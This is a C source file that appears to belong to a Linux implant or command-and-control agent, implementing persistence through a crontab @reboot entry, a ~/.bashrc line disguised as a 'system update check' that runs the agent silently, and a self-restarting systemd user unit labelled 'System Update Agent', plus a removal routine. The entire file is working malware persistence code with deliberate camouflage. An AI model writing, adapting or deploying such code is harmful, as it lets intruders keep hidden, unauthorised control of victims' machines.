// linux-agent/src/persist_linux.c
#include "persist_linux.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

// -- Persistence via crontab ------------------------------------------
int persist_crontab(const char* agent_path) {
    // Add @reboot entry to current user's crontab
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "(crontab -l 2>/dev/null; echo '@reboot %s') | crontab -",
             agent_path);

    int rc = system(cmd);
    if (rc == 0) {
        printf("[+] persist_crontab: Added @reboot entry for %s\n", agent_path);
        return 0;
    }
    printf("[!] persist_crontab: Failed (rc=%d)\n", rc);
    return -1;
}

// -- Persistence via ~/.bashrc ----------------------------------------
int persist_bashrc(const char* agent_path) {
    char* home = getenv("HOME");
    if (!home) {
        printf("[!] persist_bashrc: HOME not set\n");
        return -1;
    }

    char bashrc_path[512];
    snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", home);

    // Check if already added
    FILE* fp = fopen(bashrc_path, "r");
    if (fp) {
        char line[512];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, agent_path)) {
                fclose(fp);
                printf("[*] persist_bashrc: Already present in .bashrc\n");
                return 0;
            }
        }
        fclose(fp);
    }

    // Append
    fp = fopen(bashrc_path, "a");
    if (!fp) {
        printf("[!] persist_bashrc: Cannot open %s\n", bashrc_path);
        return -1;
    }
    fprintf(fp, "\n# system update check\n%s &>/dev/null &\n", agent_path);
    fclose(fp);

    printf("[+] persist_bashrc: Added to %s\n", bashrc_path);
    return 0;
}

// -- Persistence via systemd user unit --------------------------------
int persist_systemd_user(const char* agent_path) {
    char* home = getenv("HOME");
    if (!home) return -1;

    // Create directory
    char dir[512];
    snprintf(dir, sizeof(dir), "%s/.config/systemd/user", home);
    char mkdir_cmd[600];
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p %s", dir);
    system(mkdir_cmd);

    // Write unit file
    char unit_path[600];
    snprintf(unit_path, sizeof(unit_path), "%s/agent.service", dir);

    FILE* fp = fopen(unit_path, "w");
    if (!fp) {
        printf("[!] persist_systemd: Cannot create %s\n", unit_path);
        return -1;
    }
    fprintf(fp,
        "[Unit]\n"
        "Description=System Update Agent\n\n"
        "[Service]\n"
        "ExecStart=%s\n"
        "Restart=always\n"
        "RestartSec=30\n\n"
        "[Install]\n"
        "WantedBy=default.target\n",
        agent_path);
    fclose(fp);

    // Enable and start
    system("systemctl --user daemon-reload 2>/dev/null");
    system("systemctl --user enable agent.service 2>/dev/null");
    system("systemctl --user start agent.service 2>/dev/null");

    printf("[+] persist_systemd: Unit installed at %s\n", unit_path);
    return 0;
}

// -- Remove all persistence -------------------------------------------
int persist_remove_linux(void) {
    // Remove crontab entry
    system("crontab -l 2>/dev/null | grep -v 'agent' | crontab -");

    // Remove bashrc entry (leave file intact)
    char* home = getenv("HOME");
    if (home) {
        char cmd[600];
        snprintf(cmd, sizeof(cmd),
                 "sed -i '/system update check/d;/agent/d' %s/.bashrc 2>/dev/null",
                 home);
        system(cmd);
    }

    // Remove systemd unit
    system("systemctl --user stop agent.service 2>/dev/null");
    system("systemctl --user disable agent.service 2>/dev/null");
    if (home) {
        char unit[600];
        snprintf(unit, sizeof(unit),
                 "%s/.config/systemd/user/agent.service", home);
        unlink(unit);
    }

    printf("[+] persist_remove: All persistence removed\n");
    return 0;
}
